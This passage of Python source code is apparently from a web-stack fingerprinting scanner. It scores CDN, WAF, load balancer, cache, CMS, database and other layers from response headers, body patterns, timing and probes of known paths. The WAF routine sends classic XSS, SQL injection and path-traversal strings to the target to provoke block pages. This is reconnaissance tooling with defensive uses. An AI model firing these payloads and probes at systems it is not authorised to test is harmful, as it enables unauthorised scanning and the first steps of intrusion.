    def deep_cdn_fingerprinting(self, response: requests.Response):
        """
        Deep CDN analysis using ALL data from fingerprint list.
        Confidence scoring: Headers(40) + Body(30) + Behavioral(20) + Timing(10)
        """
        self.log("CDN", "Deep fingerprinting with confidence scoring...", "DISCOVERY")
        
        cdn_fingerprints = self.fingerprints['cdn_detection']
        detected = []
        
        for cdn_name, fingerprint_data in cdn_fingerprints.items():
            confidence = 0
            evidence = []
            
            # YOU will have these keys in your fingerprint:
            # 'headers', 'body_patterns', 'behavioral_paths', 'timing_signature'
            
            # 1. Header matching (40 points)
            headers_list = fingerprint_data.get('headers', [])
            for header_pattern in headers_list:
                for header_name, header_value in response.headers.items():
                    compiled_pattern = self.get_compiled_regex(header_pattern)
                    if compiled_pattern.search(f"{header_name}: {header_value}"):
                        confidence += 40
                        evidence.append(f"Header: {header_name}")
                        break
                if confidence >= 40:
                    break
            
            # 2. Body pattern matching (30 points)
            body_patterns = fingerprint_data.get('body_patterns', [])
            response_text = response.text.lower()
            for pattern in body_patterns:
                if pattern.lower() in response_text:
                    confidence += 30
                    evidence.append(f"Body pattern: {pattern}")
                    break
            
            # 3. Behavioral testing (20 points)
            behavioral_paths = fingerprint_data.get('behavioral_paths', [])
            for path in behavioral_paths:
                try:
                    # Apply rate limiting
                    self.rate_limiter.wait()

                    test_url = self.target_url + path
                    test_response = self.session.get(test_url, timeout=5)
                    # If path exists or returns specific code, it's behavioral evidence
                    if test_response.status_code in [200, 403, 404]:  # Existence check
                        confidence += 20
                        evidence.append(f"Behavioral: {path}")
                        break
                except:
                    pass
            
            # 4. Timing analysis — z-score con prior SQLite (D-05)
            timing_sig = fingerprint_data.get('timing_signature', {})
            if timing_sig:
                avg_latency = self._measure_latency()
                cdn_name_lower = cdn_name.lower().replace(' ', '_')

                # Leggi prior da SQLite se disponibile, altrimenti usa valori statici
                if hasattr(self, 'learning_db') and self.learning_db:
                    μ = self.learning_db.get_prior(
                        f'traceroute.cdn.{cdn_name_lower}.latency_ms',
                        static_fallback=float(timing_sig.get('avg_ms', 50))
                    )
                    σ = self.learning_db.get_prior(
                        f'traceroute.cdn.{cdn_name_lower}.latency_std',
                        static_fallback=float(timing_sig.get('jitter', 25))
                    )
                    # Registra osservazione per aggiornamento futuro
                    if hasattr(self, 'scan_id') and self.scan_id:
                        self.learning_db.record_timing(
                            self.scan_id, self.target_url,
                            cdn_name_lower, 'traceroute', avg_latency
                        )
                else:
                    μ = float(timing_sig.get('avg_ms', 50))
                    σ = float(timing_sig.get('jitter', 25))

                if σ > 0:
                    z = (avg_latency - μ) / σ
                    timing_score = math.exp(-z ** 2)  # 1.0 al centro, decade con |z|
                    confidence += int(timing_score * 10)  # max 10 come prima
                    evidence.append(f"Timing z-score: {z:.2f} (score={timing_score:.2f}, "
                                    f"obs={avg_latency:.0f}ms)")
            
            # Store if confidence is sufficient
            if confidence >= 40:  # Minimum threshold
                detected.append({
                    'name': cdn_name,
                    'confidence': confidence,
                    'evidence': evidence,
                    'level': 'HIGH' if confidence >= 70 else 'MEDIUM' if confidence >= 50 else 'LOW'
                })
        
        # Sort by confidence and add to stack
        detected.sort(key=lambda x: x['confidence'], reverse=True)
        
        if detected:
            best_match = detected[0]
            self.stack['layers'].append({
                'type': 'CDN',
                'component': best_match['name'],
                'confidence': best_match['confidence'],
                'level': best_match['level'],
                'evidence': best_match['evidence']
            })
            self.log("CDN", f"Detected: {best_match['name']} (confidence: {best_match['confidence']}/100, {best_match['level']})", "SUCCESS")
        else:
            self.log("CDN", "No CDN detected or confidence too low", "INFO")
    
    def deep_waf_fingerprinting(self, response: requests.Response):
        """
        Deep WAF analysis with active testing.
        Uses malicious payloads to trigger WAF responses.
        """
        self.log("WAF", "Deep fingerprinting with active payload testing...", "DISCOVERY")
        
        waf_fingerprints = self.fingerprints['waf_detection']
        detected = []
        
        # Test payloads to trigger WAF
        test_payloads = [
            "/?test=<script>alert(1)</script>",
            "/?test=' OR '1'='1",
            "/?test=../../../etc/passwd",
            "/?test=<img src=x onerror=alert(1)>"
        ]
        
        for waf_name, fingerprint_data in waf_fingerprints.items():
            confidence = 0
            evidence = []
            
            # 1. Passive detection from baseline response (40 points)
            headers_list = fingerprint_data.get('headers', [])
            for header_pattern in headers_list:
                for header_name, header_value in response.headers.items():
                    if re.search(header_pattern, f"{header_name}: {header_value}", re.IGNORECASE):
                        confidence += 40
                        evidence.append(f"Header: {header_name}")
                        break
                if confidence >= 40:
                    break
            
            # 2. Active testing with payloads (30 points)
            block_patterns = fingerprint_data.get('block_patterns', [])
            for payload in test_payloads:
                try:
                    test_url = self.target_url + payload
                    test_response = self.session.get(test_url, timeout=5)
                    
                    # Check if response matches WAF block pattern
                    full_response = f"{test_response.status_code} {test_response.text}".lower()
                    for pattern in block_patterns:
                        if re.search(pattern, full_response, re.IGNORECASE):
                            confidence += 30
                            evidence.append(f"Block pattern: {pattern}")
                            break
                    
                    if confidence >= 70:
                        break
                except:
                    pass
            
            # 3. Response signature analysis (30 points)
            response_signatures = fingerprint_data.get('response_signatures', [])
            response_text = response.text.lower()
            for signature in response_signatures:
                if signature.lower() in response_text:
                    confidence += 30
                    evidence.append(f"Response signature: {signature}")
                    break
            
            if confidence >= 40:
                detected.append({
                    'name': waf_name,
                    'confidence': confidence,
                    'evidence': evidence,
                    'level': 'HIGH' if confidence >= 70 else 'MEDIUM' if confidence >= 50 else 'LOW'
                })
        
        detected.sort(key=lambda x: x['confidence'], reverse=True)
        
        if detected:
            best_match = detected[0]
            self.stack['layers'].append({
                'type': 'WAF',
                'component': best_match['name'],
                'confidence': best_match['confidence'],
                'level': best_match['level'],
                'evidence': best_match['evidence']
            })
            self.log("WAF", f"Detected: {best_match['name']} (confidence: {best_match['confidence']}/100, {best_match['level']})", "SUCCESS")
        else:
            self.log("WAF", "No WAF detected or confidence too low", "INFO")
    
    def deep_proxy_fingerprinting(self, response: requests.Response):
        """
        Deep Proxy/Load Balancer analysis.
        Similar pattern to CDN/WAF with confidence scoring.
        """
        self.log("PROXY", "Deep fingerprinting...", "DISCOVERY")
        
        proxy_fingerprints = self.fingerprints['proxy_detection']
        detected = []
        
        for proxy_name, fingerprint_data in proxy_fingerprints.items():
            confidence = 0
            evidence = []
            
            # Header analysis (40 points)
            headers_list = fingerprint_data.get('headers', [])
            for header_pattern in headers_list:
                for header_name, header_value in response.headers.items():
                    if re.search(header_pattern, f"{header_name}: {header_value}", re.IGNORECASE):
                        confidence += 40
                        evidence.append(f"Header: {header_name}")
                        break
                if confidence >= 40:
                    break
            
            # Via header specific analysis (30 points)
            via = response.headers.get('Via', '').lower()
            via_patterns = fingerprint_data.get('via_patterns', [])
            for pattern in via_patterns:
                if pattern.lower() in via:
                    confidence += 30
                    evidence.append(f"Via pattern: {pattern}")
                    break
            
            # Connection behavior (20 points)
            connection_tests = fingerprint_data.get('connection_tests', [])
            # YOU can add specific connection behavior tests here
            
            if confidence >= 40:
                detected.append({
                    'name': proxy_name,
                    'confidence': confidence,
                    'evidence': evidence,
                    'level': 'HIGH' if confidence >= 70 else 'MEDIUM'
                })
        
        detected.sort(key=lambda x: x['confidence'], reverse=True)
        
        if detected:
            best_match = detected[0]
            self.stack['layers'].append({
                'type': 'PROXY',
                'component': best_match['name'],
                'confidence': best_match['confidence'],
                'level': best_match['level'],
                'evidence': best_match['evidence']
            })
            self.log("PROXY", f"Detected: {best_match['name']} (confidence: {best_match['confidence']}/100)", "SUCCESS")
    
    def deep_backend_fingerprinting(self, response: requests.Response):
        """
        Deep Backend analysis (web server, runtime, framework).
        """
        self.log("BACKEND", "Deep fingerprinting...", "DISCOVERY")
        
        backend_fingerprints = self.fingerprints['backend_detection']
        detected = []
        
        for backend_name, fingerprint_data in backend_fingerprints.items():
            confidence = 0
            evidence = []
            
            # Server header (40 points)
            server = response.headers.get('Server', '').lower()
            server_patterns = fingerprint_data.get('server_patterns', [])
            for pattern in server_patterns:
                if pattern.lower() in server:
                    confidence += 40
                    evidence.append(f"Server: {pattern}")
                    break
            
            # Technology-specific headers (30 points)
            tech_headers = fingerprint_data.get('tech_headers', {})
            for header_name, expected_value in tech_headers.items():
                actual_value = response.headers.get(header_name, '')
                if expected_value.lower() in actual_value.lower():
                    confidence += 30
                    evidence.append(f"Tech header: {header_name}")
                    break
            
            # Framework detection from response (30 points)
            framework_patterns = fingerprint_data.get('framework_patterns', [])
            for pattern in framework_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    confidence += 30
                    evidence.append(f"Framework pattern: {pattern}")
                    break
            
            if confidence >= 40:
                detected.append({
                    'name': backend_name,
                    'confidence': confidence,
                    'evidence': evidence,
                    'level': 'HIGH' if confidence >= 70 else 'MEDIUM'
                })
        
        detected.sort(key=lambda x: x['confidence'], reverse=True)
        
        if detected:
            best_match = detected[0]
            self.stack['layers'].append({
                'type': 'BACKEND',
                'component': best_match['name'],
                'confidence': best_match['confidence'],
                'level': best_match['level'],
                'evidence': best_match['evidence']
            })
            self.log("BACKEND", f"Detected: {best_match['name']} (confidence: {best_match['confidence']}/100)", "SUCCESS")

    # ------------------------------------------------------------------
    # Deep fingerprinting – additional layer types
    # ------------------------------------------------------------------

    def deep_load_balancer_fingerprinting(self, response: requests.Response):
        """
        Deep Load Balancer / Reverse-Proxy analysis.

        Confidence breakdown (100 pts max):
          40 – Fingerprint header match
          20 – Forwarding headers present (X-Forwarded-*, X-Real-IP, Forwarded)
          20 – Body pattern match
          10 – Behavioural path responds
          10 – Timing jitter (LBs add measurable jitter)
        """
        self.log("LB", "Deep fingerprinting (Load Balancer)...", "DISCOVERY")

        lb_fingerprints = self.fingerprints.get('load_balancer_detection', {})
        detected = []

        # Forwarding-header bonus (shared across all candidates)
        _forwarding = ['X-Forwarded-For', 'X-Forwarded-Host', 'X-Real-IP',
                       'X-Forwarded-Proto', 'X-Forwarded-Port', 'Forwarded']
        forwarding_bonus = min(
            sum(10 for h in _forwarding if h in response.headers),
            20
        )
        if forwarding_bonus:
            pass  # applied per-candidate below

        for lb_name, fp in lb_fingerprints.items():
            confidence = 0
            evidence = []

            # 1. Header matching (40 pts)
            for h_pattern in fp.get('headers', []):
                for h_name, h_val in response.headers.items():
                    if re.search(h_pattern, f"{h_name}: {h_val}", re.IGNORECASE):
                        confidence += 40
                        evidence.append(f"Header: {h_name}")
                        break
                if confidence >= 40:
                    break

            # 2. Via header specific analysis (20 pts, replaces generic via match)
            via_val = response.headers.get('Via', '').lower()
            for via_pat in fp.get('via_patterns', []):
                if via_pat.lower() in via_val:
                    confidence += 20
                    evidence.append(f"Via: {via_pat}")
                    break

            # 2b. Forwarding headers (20 pts)
            if forwarding_bonus:
                confidence += forwarding_bonus
                evidence.append(f"Forwarding headers present")

            # 3. Body patterns (20 pts)
            body_text = response.text.lower()
            for pattern in fp.get('body_patterns', []):
                if pattern.lower() in body_text:
                    confidence += 20
                    evidence.append(f"Body: {pattern}")
                    break

            # 4. Behavioural paths (10 pts)
            for path in fp.get('behavioral_paths', []):
                try:
                    self.rate_limiter.wait()
                    r = self.session.get(self.target_url + path, timeout=5)
                    if r.status_code in [200, 401, 403]:
                        confidence += 10
                        evidence.append(f"Path: {path}")
                        break
                except Exception:
                    pass

            if confidence >= 40:
                detected.append({
                    'name': lb_name,
                    'confidence': min(confidence, 100),
                    'evidence': evidence,
                    'level': 'HIGH' if confidence >= 70 else 'MEDIUM' if confidence >= 50 else 'LOW'
                })

        detected.sort(key=lambda x: x['confidence'], reverse=True)

        if detected:
            best = detected[0]
            self.stack['layers'].append({
                'type': 'LOAD_BALANCER',
                'component': best['name'],
                'confidence': best['confidence'],
                'level': best['level'],
                'evidence': best['evidence']
            })
            self.log("LB", f"Detected: {best['name']} "
                     f"(confidence: {best['confidence']}/100, {best['level']})", "SUCCESS")
        else:
            self.log("LB", "No Load Balancer detected or confidence too low", "INFO")

    def deep_cache_fingerprinting(self, response: requests.Response):
        """
        Deep Cache layer analysis.

        Confidence breakdown (100 pts max):
          40 – Fingerprint header match (X-Cache, X-Varnish, CF-Cache-Status…)
          20 – Cache directive headers (Age, Cache-Control with s-maxage)
          20 – Body pattern match
          20 – Repeat-request behaviour (same ETag / identical body = cached)
        """
        self.log("CACHE", "Deep fingerprinting (Cache Layer)...", "DISCOVERY")

        cache_fingerprints = self.fingerprints.get('cache_layer_detection', {})
        detected = []

        # Pre-compute repeat-request evidence once (expensive but shared)
        repeat_match = False
        try:
            self.rate_limiter.wait()
            r2 = self.session.get(self.target_url, timeout=5)
            etag1 = response.headers.get('ETag', '')
            etag2 = r2.headers.get('ETag', '')
            age = int(response.headers.get('Age', 0))
            xcache = response.headers.get('X-Cache', '').lower()
            if (etag1 and etag1 == etag2) or age > 0 or 'hit' in xcache:
                repeat_match = True
        except Exception:
            pass

        # Cache-control directive bonus (shared)
        cc = response.headers.get('Cache-Control', '')
        cache_control_bonus = 20 if ('s-maxage' in cc or 'public' in cc) else 0

        for cache_name, fp in cache_fingerprints.items():
            confidence = 0
            evidence = []

            # 1. Header matching (40 pts)
            for h_pattern in fp.get('headers', []):
                for h_name, h_val in response.headers.items():
                    if re.search(h_pattern, f"{h_name}: {h_val}", re.IGNORECASE):
                        confidence += 40
                        evidence.append(f"Header: {h_name}")
                        break
                if confidence >= 40:
                    break

            # 2. Cache-Control directives (20 pts)
            if cache_control_bonus:
                confidence += cache_control_bonus
                evidence.append(f"Cache-Control: {cc[:60]}")

            # 3. Body patterns (20 pts)
            body_text = response.text.lower()
            for pattern in fp.get('body_patterns', []):
                if pattern.lower() in body_text:
                    confidence += 20
                    evidence.append(f"Body: {pattern}")
                    break

            # 4. Repeat-request cache behaviour (20 pts)
            if repeat_match:
                confidence += 20
                evidence.append("Repeated request shows cache behaviour (Age/ETag/HIT)")

            if confidence >= 40:
                detected.append({
                    'name': cache_name,
                    'confidence': min(confidence, 100),
                    'evidence': evidence,
                    'level': 'HIGH' if confidence >= 70 else 'MEDIUM' if confidence >= 50 else 'LOW'
                })

        detected.sort(key=lambda x: x['confidence'], reverse=True)

        if detected:
            best = detected[0]
            self.stack['layers'].append({
                'type': 'CACHE',
                'component': best['name'],
                'confidence': best['confidence'],
                'level': best['level'],
                'evidence': best['evidence']
            })
            self.log("CACHE", f"Detected: {best['name']} "
                     f"(confidence: {best['confidence']}/100, {best['level']})", "SUCCESS")
        else:
            self.log("CACHE", "No Cache layer detected or confidence too low", "INFO")

    def deep_api_gateway_fingerprinting(self, response: requests.Response):
        """
        Deep API Gateway analysis.

        Confidence breakdown (100 pts max):
          40 – Fingerprint header match
          30 – API path responds (behavioural)
          20 – Body pattern match
          10 – JSON error format / auth-token clues in response
        """
        self.log("API_GW", "Deep fingerprinting (API Gateway)...", "DISCOVERY")

        gw_fingerprints = self.fingerprints.get('api_gateway_detection', {})
        detected = []

        # Pre-compute JSON-error bonus (shared)
        json_bonus = 0
        try:
            import json as _json
            _json.loads(response.text)
            # If the baseline is already JSON it might be an API response
            if any(k in response.text.lower() for k in
                   ['missing authentication', 'unauthorized', 'forbidden', 'api key']):
                json_bonus = 10
        except Exception:
            pass

        for gw_name, fp in gw_fingerprints.items():
            confidence = 0
            evidence = []

            # 1. Header matching (40 pts)
            for h_pattern in fp.get('headers', []):
                for h_name, h_val in response.headers.items():
                    if re.search(h_pattern, f"{h_name}: {h_val}", re.IGNORECASE):
                        confidence += 40
                        evidence.append(f"Header: {h_name}")
                        break
                if confidence >= 40:
                    break

            # 2. API behavioural paths (30 pts)
            for path in fp.get('behavioral_paths', []) or ['/api/', '/v1/', '/v2/', '/graphql']:
                try:
                    self.rate_limiter.wait()
                    r = self.session.get(self.target_url + path, timeout=5)
                    if r.status_code in [200, 401, 403, 404]:
                        confidence += 30
                        evidence.append(f"API path reachable: {path} ({r.status_code})")
                        break
                except Exception:
                    pass

            # 3. Body patterns (20 pts)
            body_text = response.text.lower()
            for pattern in fp.get('body_patterns', []):
                if pattern.lower() in body_text:
                    confidence += 20
                    evidence.append(f"Body: {pattern}")
                    break

            # 4. JSON / auth error clues (10 pts)
            if json_bonus:
                confidence += json_bonus
                evidence.append("JSON auth-error response detected")

            if confidence >= 40:
                detected.append({
                    'name': gw_name,
                    'confidence': min(confidence, 100),
                    'evidence': evidence,
                    'level': 'HIGH' if confidence >= 70 else 'MEDIUM' if confidence >= 50 else 'LOW'
                })

        detected.sort(key=lambda x: x['confidence'], reverse=True)

        if detected:
            best = detected[0]
            self.stack['layers'].append({
                'type': 'API_GATEWAY',
                'component': best['name'],
                'confidence': best['confidence'],
                'level': best['level'],
                'evidence': best['evidence']
            })
            self.log("API_GW", f"Detected: {best['name']} "
                     f"(confidence: {best['confidence']}/100, {best['level']})", "SUCCESS")
        else:
            self.log("API_GW", "No API Gateway detected or confidence too low", "INFO")

    def deep_service_mesh_fingerprinting(self, response: requests.Response):
        """
        Deep Service Mesh analysis (Istio, Linkerd, Envoy, Consul…).

        Confidence breakdown (100 pts max):
          40 – Fingerprint header match
          30 – Distributed tracing headers (x-b3-*, x-request-id, traceparent)
          20 – Body pattern match
          10 – Behavioural health/stats endpoint responds
        """
        self.log("MESH", "Deep fingerprinting (Service Mesh)...", "DISCOVERY")

        mesh_fingerprints = self.fingerprints.get('service_mesh_detection', {})
        detected = []

        # Distributed tracing bonus (shared)
        _trace_headers = ['x-b3-traceid', 'x-b3-spanid', 'x-b3-parentspanid',
                          'traceparent', 'tracestate', 'x-request-id', 'x-correlation-id']
        tracing_bonus = min(
            sum(10 for h in _trace_headers if h.lower() in
                {k.lower() for k in response.headers}),
            30
        )

        for mesh_name, fp in mesh_fingerprints.items():
            confidence = 0
            evidence = []

            # 1. Header matching (40 pts)
            for h_pattern in fp.get('headers', []):
                for h_name, h_val in response.headers.items():
                    if re.search(h_pattern, f"{h_name}: {h_val}", re.IGNORECASE):
                        confidence += 40
                        evidence.append(f"Header: {h_name}")
                        break
                if confidence >= 40:
                    break

            # 2. Tracing headers (30 pts)
            if tracing_bonus:
                confidence += tracing_bonus
                evidence.append(f"Distributed tracing headers present")

            # 3. Body patterns (20 pts)
            body_text = response.text.lower()
            for pattern in fp.get('body_patterns', []):
                if pattern.lower() in body_text:
                    confidence += 20
                    evidence.append(f"Body: {pattern}")
                    break

            # 4. Health / stats behavioural paths (10 pts)
            for path in fp.get('behavioral_paths', []):
                try:
                    self.rate_limiter.wait()
                    r = self.session.get(self.target_url + path, timeout=5)
                    if r.status_code in [200, 401, 403]:
                        confidence += 10
                        evidence.append(f"Mesh path: {path}")
                        break
                except Exception:
                    pass

            if confidence >= 40:
                detected.append({
                    'name': mesh_name,
                    'confidence': min(confidence, 100),
                    'evidence': evidence,
                    'level': 'HIGH' if confidence >= 70 else 'MEDIUM' if confidence >= 50 else 'LOW'
                })

        detected.sort(key=lambda x: x['confidence'], reverse=True)

        if detected:
            best = detected[0]
            self.stack['layers'].append({
                'type': 'SERVICE_MESH',
                'component': best['name'],
                'confidence': best['confidence'],
                'level': best['level'],
                'evidence': best['evidence']
            })
            self.log("MESH", f"Detected: {best['name']} "
                     f"(confidence: {best['confidence']}/100, {best['level']})", "SUCCESS")
        else:
            self.log("MESH", "No Service Mesh detected or confidence too low", "INFO")

    def deep_framework_fingerprinting(self, response: requests.Response):
        """
        Deep Application Framework / Microservice analysis
        (Django, Flask, Rails, Spring Boot, Express, FastAPI…).

        Confidence breakdown (100 pts max):
          40 – X-Powered-By / Server header match
          30 – Framework body pattern
          20 – Framework-specific behavioural path
          10 – Tech-specific response headers
        """
        self.log("FRAMEWORK", "Deep fingerprinting (App Framework)...", "DISCOVERY")

        fw_fingerprints = self.fingerprints.get('microservice_detection', {})
        detected = []

        for fw_name, fp in fw_fingerprints.items():
            confidence = 0
            evidence = []

            # 1. X-Powered-By / Server header (40 pts)
            powered = response.headers.get('X-Powered-By', '').lower()
            server  = response.headers.get('Server', '').lower()
            for h_pattern in fp.get('headers', []):
                target = f"x-powered-by: {powered} server: {server}"
                if re.search(h_pattern, target, re.IGNORECASE):
                    confidence += 40
                    evidence.append(f"Header match: {h_pattern}")
                    break

            # 2. Body patterns (30 pts)
            body_text = response.text.lower()
            for pattern in fp.get('body_patterns', []):
                if pattern.lower() in body_text:
                    confidence += 30
                    evidence.append(f"Body: {pattern}")
                    break

            # 3. Behavioural paths (20 pts)
            for path in fp.get('behavioral_paths', []):
                try:
                    self.rate_limiter.wait()
                    r = self.session.get(self.target_url + path, timeout=5)
                    if r.status_code in [200, 401, 403]:
                        confidence += 20
                        evidence.append(f"Framework path: {path} ({r.status_code})")
                        break
                except Exception:
                    pass

            # 4. Technology-specific response headers (10 pts)
            for h_name, expected in fp.get('tech_headers', {}).items():
                if h_name in response.headers and expected.lower() in response.headers[h_name].lower():
                    confidence += 10
                    evidence.append(f"Tech header: {h_name}")
                    break

            if confidence >= 40:
                detected.append({
                    'name': fw_name,
                    'confidence': min(confidence, 100),
                    'evidence': evidence,
                    'level': 'HIGH' if confidence >= 70 else 'MEDIUM' if confidence >= 50 else 'LOW'
                })

        detected.sort(key=lambda x: x['confidence'], reverse=True)

        if detected:
            best = detected[0]
            self.stack['layers'].append({
                'type': 'FRAMEWORK',
                'component': best['name'],
                'confidence': best['confidence'],
                'level': best['level'],
                'evidence': best['evidence']
            })
            self.log("FRAMEWORK", f"Detected: {best['name']} "
                     f"(confidence: {best['confidence']}/100, {best['level']})", "SUCCESS")
        else:
            self.log("FRAMEWORK", "No App Framework detected or confidence too low", "INFO")

    def deep_cms_fingerprinting(self, response: requests.Response):
        """
        Deep CMS detection (WordPress, Drupal, Joomla, Magento, Shopify…).

        Confidence breakdown (100 pts max):
          35 – Body pattern match (most reliable: CMS always injects its assets/paths)
          25 – Cookie name match
          25 – Header / tech-header match
          15 – Behavioural path responds (login/admin endpoint exists)
        """
        self.log("CMS", "Deep fingerprinting (Content Management System)...", "DISCOVERY")

        cms_fingerprints = self.fingerprints.get('cms_detection', {})
        detected = []
        body_text = response.text.lower()

        for cms_name, fp in cms_fingerprints.items():
            confidence = 0
            evidence = []

            # 1. Body patterns (35 pts) – most reliable signal
            for pattern in fp.get('body_patterns', []):
                if pattern.lower() in body_text:
                    confidence += 35
                    evidence.append(f"Body: {pattern}")
                    break

            # 2. Cookie patterns (25 pts)
            for c_pattern in fp.get('cookies', []):
                for cookie_name in response.cookies.keys():
                    if c_pattern.lower() in cookie_name.lower():
                        confidence += 25
                        evidence.append(f"Cookie: {cookie_name}")
                        break
                else:
                    continue
                break

            # 3. Headers / tech-headers (25 pts)
            matched_header = False
            for h_pattern in fp.get('headers', []):
                for h_name in response.headers.keys():
                    if h_pattern.lower() in h_name.lower():
                        confidence += 25
                        evidence.append(f"Header: {h_name}")
                        matched_header = True
                        break
                if matched_header:
                    break
            if not matched_header:
                for h_name, expected in fp.get('tech_headers', {}).items():
                    actual = response.headers.get(h_name, '')
                    if expected == '' and actual:
                        confidence += 25
                        evidence.append(f"Tech header: {h_name}")
                        break
                    elif expected and expected.lower() in actual.lower():
                        confidence += 25
                        evidence.append(f"Tech header: {h_name}={actual[:40]}")
                        break

            # 4. Behavioural paths (15 pts)
            for path in fp.get('behavioral_paths', []):
                try:
                    self.rate_limiter.wait()
                    r = self.session.get(self.target_url + path, timeout=5,
                                         allow_redirects=False)
                    if r.status_code in [200, 301, 302, 401, 403]:
                        confidence += 15
                        evidence.append(f"Path exists: {path} ({r.status_code})")
                        break
                except Exception:
                    pass

            # Soglia 50: richiede almeno 2 tipi di evidenza indipendenti
            # (body+cookie, body+header, ecc.) per ridurre falsi positivi
            if confidence >= 50 and len(evidence) >= 2:
                detected.append({
                    'name': cms_name,
                    'confidence': min(confidence, 100),
                    'evidence': evidence,
                    'level': 'HIGH' if confidence >= 70 else 'MEDIUM' if confidence >= 50 else 'LOW',
                })

        detected.sort(key=lambda x: x['confidence'], reverse=True)

        if detected:
            best = detected[0]
            self.stack['layers'].append({
                'type': 'CMS',
                'component': best['name'],
                'confidence': best['confidence'],
                'level': best['level'],
                'evidence': best['evidence'],
            })
            self.log("CMS", f"Detected: {best['name']} "
                     f"(confidence: {best['confidence']}/100, {best['level']})", "SUCCESS")
        else:
            self.log("CMS", "No CMS detected or confidence too low", "INFO")

    def deep_database_fingerprinting(self, response: requests.Response):
        """
        Database layer inference via HTTP.

        I DB non sono mai esposti direttamente; la detection è inferenziale:

        Confidence breakdown (100 pts max):
          40 – Proxy/specifici header DB (x-pgbouncer, x-elastic-product, ecc.)
          30 – Errore/stack-trace nel body che rivela il DB engine
          20 – Correlazione con backend rilevato (Ruby → PostgreSQL, PHP → MySQL)
          10 – Path amministrativo risponde (phpmyadmin, /_cat/health, ecc.)

        Fino a 2 DB rilevati (es. MySQL + Redis).
        """
        self.log("DB", "Inferring database layer...", "DISCOVERY")

        db_fingerprints = self.fingerprints.get('database_detection', {})
        detected = []
        body_text = response.text.lower()[:20000]  # scan first 20 KB

        # Backend già rilevati — usati per correlazione
        detected_backends = {
            l['component'].lower()
            for l in self.stack['layers']
            if l['type'] in ('BACKEND', 'FRAMEWORK')
        }

        for db_name, fp in db_fingerprints.items():
            confidence = 0
            evidence = []

            # 1. Proxy/header specifico (40 pts) — segnale più affidabile
            for h in fp.get('proxy_headers', []):
                if response.headers.get(h):
                    confidence += 40
                    evidence.append(f"Proxy header: {h}")
                    break

            # 2. Errori/stack-trace nel body (30 pts)
            for pattern in fp.get('error_patterns', []):
                if re.search(pattern, body_text, re.IGNORECASE):
                    confidence += 30
                    evidence.append(f"Error pattern: {pattern[:40]}")
                    break

            # 2b. Body pattern generico (15 pts) — solo se nessun errore trovato
            if confidence < 30:
                for pattern in fp.get('body_patterns', []):
                    if pattern.lower() in body_text:
                        confidence += 15
                        evidence.append(f"Body: {pattern}")
                        break

            # 3. Correlazione backend rilevato (20 pts)
            for kw in fp.get('backend_correlation', []):
                if any(kw in b for b in detected_backends):
                    confidence += 20
                    evidence.append(f"Backend correlation: {kw}")
                    break

            # 4. Path amministrativo (10 pts)
            for path in fp.get('behavioral_paths', []):
                try:
                    self.rate_limiter.wait()
                    r = self.session.get(
                        self.target_url.rstrip('/') + path,
                        timeout=4, allow_redirects=False
                    )
                    if r.status_code in [200, 401, 403]:
                        confidence += 10
                        evidence.append(f"Admin path: {path} ({r.status_code})")
                        break
                except Exception:
                    pass

            # Soglia bassa (30) perché l'inferenza è per natura debole
            if confidence >= 30 and evidence:
                detected.append({
                    'name': db_name,
                    'confidence': min(confidence, 100),
                    'evidence': evidence,
                    'level': 'HIGH' if confidence >= 70 else 'MEDIUM' if confidence >= 50 else 'LOW',
                })

        detected.sort(key=lambda x: x['confidence'], reverse=True)

        added = 0
        for match in detected:
            if added >= 2:  # max 2 DB per stack (es. PostgreSQL + Redis)
                break
            self.stack['layers'].append({
                'type': 'DATABASE',
                'component': match['name'],
                'confidence': match['confidence'],
                'level': match['level'],
                'evidence': match['evidence'],
            })
            self.log("DB", f"Inferred: {match['name']} "
                     f"(confidence: {match['confidence']}/100, {match['level']})", "SUCCESS")
            added += 1

        if added == 0:
            self.log("DB", "No database layer inferred", "INFO")

    def _resolve_vendor_conflicts(self):
        """
        Post-processing: rimuove layer incompatibili con rilevamenti
        ad alta confidenza già presenti nello stack.

        Regole:
        - aws_cloudfront → impossibile coesistere con gcp_lb o citrix_netscaler_lb
        - cloudflare CDN (≥60%) → rimuove WAF non-cloudflare a bassa confidence
        - Per tipi a istanza singola (WAF, API_GATEWAY, CMS): tieni solo
          il candidato con confidence più alta se gli altri sono a LOW
        """
        layers = self.stack['layers']

        cdn_map = {
            l['component']: l['confidence']
            for l in layers if l['type'] == 'CDN'
        }

        # AWS CloudFront → GCP LB e Citrix NetScaler sono impossibili
        if 'aws_cloudfront' in cdn_map:
            before = len(layers)
            self.stack['layers'] = [
                l for l in layers
                if not (
                    l['type'] == 'LOAD_BALANCER'
                    and l['component'] in ('gcp_lb', 'citrix_netscaler_lb')
                )
            ]
            layers = self.stack['layers']
            removed = before - len(layers)
            if removed:
                self.log("CORRELATION",
                         f"Vendor conflict: removed {removed} LB layer(s) "
                         f"incompatible with aws_cloudfront", "INFO")

        # Cloudflare CDN ad alta confidence → rimuovi WAF non-cloudflare a LOW
        if cdn_map.get('cloudflare', 0) >= 60:
            self.stack['layers'] = [
                l for l in layers
                if not (
                    l['type'] == 'WAF'
                    and 'cloudflare' not in l['component']
                    and l['confidence'] < 60
                )
            ]
            layers = self.stack['layers']

        # Per tipi a istanza singola: tieni solo il migliore se gli altri
        # sono a LOW confidence (< 50). CDN, BACKEND, PROXY, CACHE, DATABASE
        # possono avere più istanze legittime — non vengono toccati qui.
        single_instance = {'WAF', 'API_GATEWAY', 'CMS', 'SERVICE_MESH'}
        for layer_type in single_instance:
            candidates = sorted(
                [l for l in layers if l['type'] == layer_type],
                key=lambda x: x['confidence'], reverse=True
            )
            if len(candidates) > 1:
                # Rimuovi i duplicati a bassa confidence
                to_remove = [c for c in candidates[1:] if c['confidence'] < 50]
                for rem in to_remove:
                    self.stack['layers'].remove(rem)

    def test_behavioral_paths(self):
        """
        Actively test behavioral paths defined in fingerprints.
        This improves detection confidence by probing specific endpoints.
        """
        self.log("BEHAVIORAL", "Testing behavioral paths for all fingerprints...", "INFO")

        all_paths_tested = 0
        paths_discovered = []

        # Test all fingerprint categories
        for category, fingerprints in self.fingerprints.items():
            for component_name, fingerprint_data in fingerprints.items():
                behavioral_paths = fingerprint_data.get('behavioral_paths', [])

                for path in behavioral_paths:
                    try:
                        test_url = self.target_url + path
                        response = self.session.get(test_url, timeout=5, allow_redirects=False)
                        all_paths_tested += 1

                        # Analyze response for component evidence
                        if response.status_code in [200, 401, 403]:  # Path exists
                            # Check for component-specific patterns
                            body_patterns = fingerprint_data.get('body_patterns', [])
